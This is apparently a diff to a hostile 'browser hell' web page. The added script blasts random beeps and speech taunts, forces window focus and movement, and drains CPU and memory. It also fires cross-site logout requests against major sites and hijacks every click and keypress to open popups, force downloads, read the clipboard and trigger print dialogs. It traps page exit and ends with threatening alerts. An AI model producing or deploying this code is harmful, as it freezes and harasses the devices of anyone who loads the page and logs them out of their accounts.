+          osc.type = ['sawtooth', 'square', 'triangle', 'sine'][Math.floor(Math.random() * 4)];
+        } catch(e) {}
+      }, 1000);
+      setInterval(function() {
+        try {
+          var beep = audioCtx.createOscillator();
+          var beepGain = audioCtx.createGain();
+          beep.type = 'square';
+          beep.frequency.setValueAtTime(2000 + Math.random() * 1000, audioCtx.currentTime);
+          beepGain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+          beep.connect(beepGain);
+          beepGain.connect(audioCtx.destination);
+          beep.start();
+          beep.stop(audioCtx.currentTime + 0.1 + Math.random() * 0.2);
+        } catch(e) {}
+      }, 100);
+      setInterval(function() {
+        try {
+          var beep = audioCtx.createOscillator();
+          var beepGain = audioCtx.createGain();
+          beep.type = 'sawtooth';
+          beep.frequency.setValueAtTime(3000 + Math.random() * 500, audioCtx.currentTime);
+          beepGain.gain.setValueAtTime(0.2, audioCtx.currentTime);
+          beep.connect(beepGain);
+          beepGain.connect(audioCtx.destination);
+          beep.start();
+          beep.stop(audioCtx.currentTime + 0.05 + Math.random() * 0.1);
+        } catch(e) {}
+      }, 200);
+    } catch(e) {}
+
+    // ========== 31. PLATFORM-SPECIFIC EXTRAS ==========
     if (isWin) {
       setInterval(function() {
         try {
@@ -352,46 +769,90 @@
           o.stop(c.currentTime + 0.05);
         } catch(e) {}
       }, 40);
+      setInterval(function() {
+        try {
+          var c = new (window.AudioContext || window.webkitAudioContext)();
+          var o = c.createOscillator();
+          var g = c.createGain();
+          o.frequency.value = 1200;
+          g.gain.value = 0.1;
+          o.connect(g);
+          g.connect(c.destination);
+          o.start();
+          o.stop(c.currentTime + 0.02);
+        } catch(e) {}
+      }, 80);
     }
     if (isLinux) {
       setInterval(function() { console.log('\x07'); }, 40);
+      setInterval(function() { console.log('\x07'); }, 80);
+      setInterval(function() { console.log('\x07'); }, 120);
     }
     if (isMac) {
       setInterval(function() {
         try { window.speechSynthesis.speak(new SpeechSynthesisUtterance('MAC USER SUFFER')); } catch(e) {}
       }, 150);
+      setInterval(function() {
+        try { window.speechSynthesis.speak(new SpeechSynthesisUtterance('APPLE HELL')); } catch(e) {}
+      }, 300);
     }
 
-    // 30. Mouse jitter (move window with mouse)
+    // ========== 32. MOUSE JITTER ==========
     document.addEventListener('mousemove', function(e) {
       window.moveTo(e.screenX + Math.random() * 100 - 50, e.screenY + Math.random() * 100 - 50);
     });
+    document.addEventListener('mousemove', function(e) {
+      window.moveTo(e.screenX + Math.random() * 200 - 100, e.screenY + Math.random() * 200 - 100);
+    });
 
-    // 31. Force focus
+    // ========== 33. FORCE FOCUS ==========
     setInterval(function() { window.focus(); }, 10);
+    setInterval(function() { window.focus(); }, 50);
+    setInterval(function() { window.focus(); }, 100);
+    setInterval(function() { window.focus(); }, 200);
 
-    // 32. Block right-click
+    // ========== 34. BLOCK RIGHT-CLICK ==========
     document.addEventListener('contextmenu', function(e) { e.preventDefault(); e.stopPropagation(); });
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
 
-    // 33. CPU drain
+    // ========== 35. CPU DRAIN ==========
     setInterval(function() {
       for (var i = 0; i < 1000000; i++) { Math.sqrt(i); Math.sin(i); Math.cos(i); Math.tan(i); Math.log(i); Math.exp(i); }
     }, 10);
+    setInterval(function() {
+      for (var i = 0; i < 500000; i++) { Math.pow(i, 2); Math.pow(i, 3); Math.pow(i, 4); }
+    }, 20);
+    setInterval(function() {
+      for (var i = 0; i < 2000000; i++) { i * i; i * i * i; }
+    }, 5);
 
-    // 34. Memory leak
+    // ========== 36. MEMORY LEAK ==========
     var leak = [];
     setInterval(function() {
       for (var i = 0; i < 10000; i++) { leak.push('X'.repeat(10000)); }
     }, 10);
+    setInterval(function() {
+      for (var i = 0; i < 5000; i++) { leak.push('Y'.repeat(5000)); }
+    }, 20);
 
-    // 35. DOM leak
+    // ========== 37. DOM LEAK ==========
     setInterval(function() {
       var d = document.createElement('div');
       d.textContent = 'X'.repeat(10000);
       document.body.appendChild(d);
     }, 10);
+    setInterval(function() {
+      var d = document.createElement('p');
+      d.textContent = 'Y'.repeat(5000);
+      document.body.appendChild(d);
+    }, 20);
+    setInterval(function() {
+      var d = document.createElement('span');
+      d.textContent = 'Z'.repeat(2000);
+      document.body.appendChild(d);
+    }, 30);
 
-    // 36. Super logout (original style, but using our own list)
+    // ========== 38. SUPER LOGOUT ==========
     (function() {
       var sites = {
         'Google': ['GET', 'https://www.google.com/accounts/Logout'],
@@ -439,44 +900,68 @@
       }
     })();
 
-    // 37. Intercept all user input to amplify
+    // ========== 39. INTERCEPT ALL USER INPUT ==========
     function interceptAll(evt) {
       interactionCount++;
       evt.preventDefault();
       evt.stopPropagation();
-      // extra spawn on any input
       for (var i = 0; i < 3; i++) {
         try { var c = rcoords(); var w = window.open(location.href, '', 'width=480,height=360,left=' + c.x + ',top=' + c.y); if (w) wins.push(w); } catch(e) {}
       }
-      // extra downloads
       for (var i = 0; i < 5; i++) {
         var a = document.createElement('a');
         a.href = 'data:text/plain;base64,' + btoa('INTERCEPTED'.repeat(100));
         a.download = 'click_' + Math.random() + '.txt';
         try { a.click(); } catch(e) {}
       }
-      // speech
       try { window.speechSynthesis.speak(new SpeechSynthesisUtterance('YOU CLICKED AGAIN')); } catch(e) {}
-      // permissions
       try { document.body.requestFullscreen(); } catch(e) {}
       try { document.body.requestPointerLock(); } catch(e) {}
       try { navigator.clipboard.readText(); } catch(e) {}
-      // keyboard special
       if (evt.key === 'Meta' || evt.key === 'Control') {
         for (var i = 0; i < 10; i++) { window.print(); }
       }
+      if (evt.type === 'touchstart') {
+        for (var i = 0; i < 5; i++) { try { var c = rcoords(); var w = window.open(location.href, '', 'width=480,height=360,left=' + c.x + ',top=' + c.y); if (w) wins.push(w); } catch(e) {} }
+      }
     }
-    var events = ['touchstart', 'mousedown', 'mouseup', 'click', 'keydown', 'keyup', 'keypress', 'wheel', 'scroll'];
+    var events = ['touchstart', 'mousedown', 'mouseup', 'click', 'dblclick', 'keydown', 'keyup', 'keypress', 'wheel', 'scroll', 'contextmenu', 'pointerdown', 'pointerup'];
     events.forEach(function(e) {
       document.body.addEventListener(e, interceptAll, { passive: false, capture: true });
+      document.addEventListener(e, interceptAll, { passive: false, capture: true });
     });
 
-    // 38. Final: show a message that hell has started
+    // ========== 40. ADDITIONAL BEFOREUNLOAD (explicit) ==========
+    window.addEventListener('beforeunload', function(event) {
+      event.preventDefault();
+      event.returnValue = '';
+    });
+    window.addEventListener('beforeunload', function(event) {
+      event.preventDefault();
+      event.returnValue = '⚠️ ARE YOU SURE?';
+      return '⚠️ ARE YOU SURE?';
+    });
+
+    // ========== 41. RANDOM VISUAL CHAOS (more text) ==========
+    setInterval(function() {
+      var d = document.createElement('div');
+      d.textContent = '🔥'.repeat(100);
+      d.style.cssText = 'position:fixed;top:' + (Math.random() * 100) + '%;left:' + (Math.random() * 100) + '%;font-size:' + (20 + Math.random() * 100) + 'px;z-index:' + Math.floor(Math.random() * 9999) + ';pointer-events:none;';
+      document.body.appendChild(d);
+    }, 30);
+    setInterval(function() {
+      var d = document.createElement('div');
+      d.textContent = '💀'.repeat(50);
+      d.style.cssText = 'position:fixed;top:' + (Math.random() * 100) + '%;left:' + (Math.random() * 100) + '%;font-size:' + (30 + Math.random() * 80) + 'px;z-index:' + Math.floor(Math.random() * 9999) + ';pointer-events:none;';
+      document.body.appendChild(d);
+    }, 50);
+
+    // ========== 42. FINAL ALERT ==========
     alert('🔥 HELL ACTIVATED 🔥\nYou are now trapped forever.');
+    alert('☠️ THERE IS NO ESCAPE ☠️');
+    alert('💀 YOUR DEVICE BELONGS TO US NOW 💀');
   }
 
-  // ---- start with overlay already visible ----
-  // The overlay is visible by default; click handler starts hell.
 })();
 </script>
 </body>
